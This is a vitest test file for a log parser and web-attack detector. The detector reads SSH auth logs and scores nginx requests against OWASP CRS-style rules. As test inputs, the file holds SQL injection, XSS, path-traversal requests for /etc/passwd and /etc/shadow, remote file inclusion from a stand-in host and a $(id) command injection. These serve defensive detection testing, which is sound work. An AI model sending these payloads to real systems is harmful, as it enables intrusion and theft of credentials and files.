import { afterEach, describe, it, expect } from 'vitest';
import {
  assessNginxRequest,
  attackSeverity,
  configureAttackDetection,
  detectAttackPattern,
  parseAuthLog,
  parseNginxLog,
} from '../log-parser.js';
import type { NginxLogEntry } from '../../types/events.js';

describe('parseAuthLog', () => {
  it('reads the legacy BSD syslog timestamp', () => {
    const entry = parseAuthLog(
      'Sep 25 09:23:31 host sshd[1234]: Failed password for root from 45.33.22.11 port 22 ssh2',
    );
    expect(entry?.fields.process).toBe('sshd');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.user).toBe('root');
  });

  it('reads the RFC3339 timestamp rsyslog writes by default now', () => {
    // Before this, every line in a modern /var/log/auth.log failed to parse and
    // ssh-guard sat at zero events while SSH was being brute-forced.
    const entry = parseAuthLog(
      '2026-09-25T09:23:31.141344+00:00 host sshd-session[84073]: Failed password for root from 45.33.22.11 port 22 ssh2',
    );
    expect(entry).not.toBeNull();
    expect(entry?.fields.process).toBe('sshd-session');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.timestamp.getUTCFullYear()).toBe(2026);
    expect(entry?.timestamp.getUTCHours()).toBe(9);
  });

  it('pulls the user out of an invalid-user line', () => {
    const entry = parseAuthLog(
      '2026-09-25T09:23:31.141344+00:00 host sshd-session[1]: Invalid user admin123 from 103.77.88.99 port 5',
    );
    expect(entry?.fields.user).toBe('admin123');
    expect(entry?.fields.ip).toBe('103.77.88.99');
  });

  it('returns null on a line that is not auth-shaped', () => {
    expect(parseAuthLog('this is not a log line')).toBeNull();
  });
});

describe('parseNginxLog', () => {
  const combined =
    '45.33.22.11 - - [25/Sep/2026:09:19:29 +0000] "GET /ring/dnin/previous HTTP/1.1" 402 614 "-" "Mozilla/5.0"';

  it('reads the stock combined format', () => {
    const entry = parseNginxLog(combined);
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.method).toBe('GET');
    expect(entry?.fields.path).toBe('/ring/dnin/previous');
    expect(entry?.fields.status).toBe('402');
    expect(entry?.fields.host).toBeUndefined();
  });

  it('reads a $host-prefixed format and keeps the site', () => {
    const entry = parseNginxLog(`rssamplifier.com ${combined}`);
    expect(entry?.fields.host).toBe('rssamplifier.com');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.status).toBe('402');
    expect(entry?.fields.path).toBe('/ring/dnin/previous');
  });
});

/** A combined-format line for `request` ("GET /path HTTP/1.1"), with optional Referer and User-Agent. */
function line(request: string, { referer = '-', ua = 'Mozilla/5.0' } = {}): NginxLogEntry {
  const entry = parseNginxLog(`203.0.113.9 - - [25/Sep/2026:09:19:29 +0000] "${request}" 200 614 "${referer}" "${ua}"`);
  if (!entry) throw new Error(`unparseable: ${request}`);
  return entry;
}

describe('web attack detection (OWASP CRS, PL1)', () => {
  afterEach(() => configureAttackDetection(undefined));

  it('does not call a URL in a query parameter an attack', () => {
    // rssamplifier.com serves exactly this shape to ordinary readers. Flagging
    // it CRITICAL meant auto-defence would ban them.
    for (const path of [
      '/rssamplifier/read?p=https://example.com/article',
      '/noticias8islas-com/read?p=https%3A%2F%2Fnoticias8islas.com%2F%3Fp%3D79855',
      '/share?url=https://example.com/post?id=1',
    ]) {
      const assessment = assessNginxRequest(line(`GET ${path} HTTP/2.0`));
      expect(assessment.score, path).toBeLessThan(assessment.threshold);
      expect(attackSeverity(assessment), path).toBeNull();
    }
  });

  it('puts classic attacks at or over the threshold', () => {
    const cases: Array<[string, string]> = [
      ['GET /search?q=1%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1', 'sqli'],
      ['GET /item?id=1+AND+SLEEP(5) HTTP/1.1', 'sqli'],
      ['GET /x?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1', 'xss'],
      ['GET /x?q=<img%20src=x%20onerror=alert(1)> HTTP/1.1', 'xss'],
      ['GET /download?file=../../../../etc/passwd HTTP/1.1', 'path_traversal'],
      ['GET /index.php?page=http://192.0.2.7/shell.txt HTTP/1.1', 'rfi'],
      ['GET /index.php?page=http://evil.example/shell.txt? HTTP/1.1', 'rfi'],
      ['GET /x?c=$(id) HTTP/1.1', 'rce'],
      ['GET /?f=php://input HTTP/1.1', 'php_injection'],
    ];
    for (const [request, type] of cases) {
      const assessment = assessNginxRequest(line(request));
      expect(assessment.score, request).toBeGreaterThanOrEqual(assessment.threshold);
      expect(assessment.attackType, request).toBe(type);
      expect(attackSeverity(assessment), request).not.toBeNull();
    }
  });

  it('reads the User-Agent and Referer, not just the request line', () => {
    expect(assessNginxRequest(line('GET / HTTP/1.1', { ua: 'sqlmap/1.7.2#stable (https://sqlmap.org)' })).attackType).toBe('scanner');
    const viaReferer = assessNginxRequest(line('GET / HTTP/1.1', { referer: 'https://x.example/?q=<script>alert(1)</script>' }));
    expect(attackSeverity(viaReferer)).not.toBeNull();
    // nginx logs an absent header as "-"; that is not a value to inspect.
    expect(assessNginxRequest(line('GET / HTTP/1.1', { referer: '-', ua: '-' })).score).toBe(0);
  });

  it('sees a quote nginx logged as \\x22', () => {
    // 942540 needs the quote itself; without undoing nginx's escaping it
    // would only ever see the four characters `\x22`.
    expect(assessNginxRequest(line('GET /?q=x\\x22; HTTP/1.1')).matches.map((m) => m.id)).toContain(942540);
    expect(assessNginxRequest(line('GET /?q=x; HTTP/1.1')).score).toBe(0);
  });

  it('scores one CRITICAL rule as high and two or more as critical', () => {
    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
    expect(one.score).toBe(5);
    expect(attackSeverity(one)).toBe('high');
    const several = assessNginxRequest(line('GET /download?file=../../../../etc/passwd HTTP/1.1'));
    expect(several.score).toBeGreaterThanOrEqual(10);
    expect(attackSeverity(several)).toBe('critical');
  });

  it('honours [detection] threshold and rule exclusions', () => {
    configureAttackDetection({ anomaly_threshold: 10 });
    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
    expect(one.score).toBe(5);
    expect(attackSeverity(one)).toBeNull();

    configureAttackDetection({ exclude_rules: [933140] });
    expect(assessNginxRequest(line('GET /?f=php://input HTTP/1.1')).score).toBe(0);
  });

  it('leaves 941130 off unless include_rules re-enables it', () => {
    // 941130 matches `xhtml` in the path, so with it on, every visitor to a
    // JSF site would be banned for XSS.
    const page = line('GET /app/page.xhtml HTTP/1.1');
    expect(attackSeverity(assessNginxRequest(page))).toBeNull();

    configureAttackDetection({ include_rules: [941130] });
    const reEnabled = assessNginxRequest(page);
    expect(reEnabled.matches.map((m) => m.id)).toContain(941130);
    expect(attackSeverity(reEnabled)).toBe('high');
  });

  it('adds exclude_rules to the default exclusions and lets it win over include_rules', () => {
    const page = line('GET /app/page.xhtml HTTP/1.1');
    const phpInput = line('GET /?f=php://input HTTP/1.1');

    configureAttackDetection({ exclude_rules: [933140] });
    expect(assessNginxRequest(phpInput).score).toBe(0);
    expect(attackSeverity(assessNginxRequest(page))).toBeNull();

    configureAttackDetection({ exclude_rules: [933140], include_rules: [941130] });
    expect(assessNginxRequest(phpInput).score).toBe(0);
    expect(attackSeverity(assessNginxRequest(page))).toBe('high');

    configureAttackDetection({ exclude_rules: [941130], include_rules: [941130] });
    expect(attackSeverity(assessNginxRequest(page))).toBeNull();
  });

  it('bans a request whose path names an OS file (ThreatCrush rule 10001)', () => {
    // CRS checks lfi-os-files.data against arguments only, so these scored
    // nothing once the hand-written `etc/passwd` regex was gone.
    for (const path of ['/etc/passwd', '/../../etc/passwd', '/%2fetc%2fpasswd', '%2fetc%2fpasswd', '/ETC/shadow', '/c:/windows/system32/config/sam']) {
      const assessment = assessNginxRequest(line(`GET ${path} HTTP/1.1`));
      expect(assessment.matches.map((m) => m.id), path).toContain(10001);
      expect(assessment.attackType, path).toBe('path_traversal');
      expect(attackSeverity(assessment), path).not.toBeNull();
    }
  });

  it('leaves pages alone that only mention an OS file inside their path', () => {
    for (const path of [
      '/blog/etc/hosts-file-explained',
      '/docs/etc/passwd-format',
      '/etc/initial-thoughts',
      '/myetc/passwd',
      '/etcetera/passwd',
      '/apache/logo.png',
      '/var/logo.png',
      '/node_modules/jquery/dist/jquery.min.js',
      '/perl/intro.html',
    ]) {
      expect(assessNginxRequest(line(`GET ${path} HTTP/1.1`)).score, path).toBe(0);
    }
  });

  it('leaves a file CRS already restricts in the path to 930130, so it scores once', () => {
    for (const path of ['/.git/config', '/proc/self/environ', '/.env']) {
      expect(assessNginxRequest(line(`GET ${path} HTTP/1.1`)).matches.map((m) => m.id), path).toEqual([930130]);
    }
  });

  it('switches rule 10001 off with exclude_rules', () => {
    configureAttackDetection({ exclude_rules: [10001] });
    const assessment = assessNginxRequest(line('GET /etc/passwd HTTP/1.1'));
    expect(assessment.score).toBe(0);
    expect(attackSeverity(assessment)).toBeNull();
  });

  it('bans tautology and comment SQLi that only libinjection sees (CRS 942100)', () => {
    // No regex rule at PL1 matches these; libinjection's tokenizer does.
    for (const request of [
      'GET /login?user=1%27%20OR%201=1 HTTP/1.1',
      'GET /login?user=1\\x27+OR+1=1 HTTP/1.1',
      'GET /login?user=admin%27--&pass=x HTTP/1.1',
      'GET /item?id=1%20or%202%201.e%2F1 HTTP/1.1',
    ]) {
      const assessment = assessNginxRequest(line(request));
      expect(assessment.matches.map((m) => m.id), request).toContain(942100);
      expect(assessment.attackType, request).toBe('sqli');
      expect(attackSeverity(assessment), request).not.toBeNull();
    }
    // 942100 also reads the User-Agent and Referer, as CRS does.
    expect(assessNginxRequest(line('GET / HTTP/1.1', { ua: "1' OR 1=1--" })).matches.map((m) => m.id)).toContain(942100);
    expect(assessNginxRequest(line('GET / HTTP/1.1', { referer: 'x%27 OR 1=1--' })).matches.map((m) => m.id)).toContain(942100);
  });

  it('scores XSS libinjection finds (CRS 941100) in arguments and the User-Agent', () => {
    for (const entry of [
      line('GET /x?q=%22%3E%3Csvg%20onload=alert(1)%3E HTTP/1.1'),
      line('GET /x?%3Cimg%20src=x%20onerror=alert(1)%3E=1 HTTP/1.1'),
      line('GET / HTTP/1.1', { ua: '\\x22><svg onload=alert(1)>' }),
    ]) {
      const assessment = assessNginxRequest(entry);
      expect(assessment.matches.map((m) => m.id), entry.raw).toContain(941100);
      expect(assessment.attackType, entry.raw).toBe('xss');
      expect(attackSeverity(assessment), entry.raw).not.toBeNull();
    }
  });

  it('leaves apostrophes, quotes and SQL words in ordinary input alone', () => {
    for (const path of [
      "/search?q=O'Brien",
      '/search?q=O%27Brien+and+Smith',
      '/search?q=rock+%27n%27+roll',
      '/search?q=%22exact+phrase%22',
      '/search?q=don%27t+stop+believin%27',
      '/search?q=where+is+george',
      '/search?q=1+or+2',
      '/api/items?filter=%7B%22status%22%3A%22open%22%2C%22n%22%3A1%7D',
      '/profile?email=o%27brien%40example.com',
    ]) {
      expect(assessNginxRequest(line(`GET ${path} HTTP/1.1`, { referer: `https://example.com${path}` })).score, path).toBe(0);
    }
  });

  it('keeps detectAttackPattern answering with the attack type', () => {
    expect(detectAttackPattern('/../../etc/passwd')).toBe('path_traversal');
    expect(detectAttackPattern('/topics/rochester/podcasts.rss')).toBeNull();
    expect(detectAttackPattern('/~anthony/blog/139-post.html')).toBeNull();
  });
});
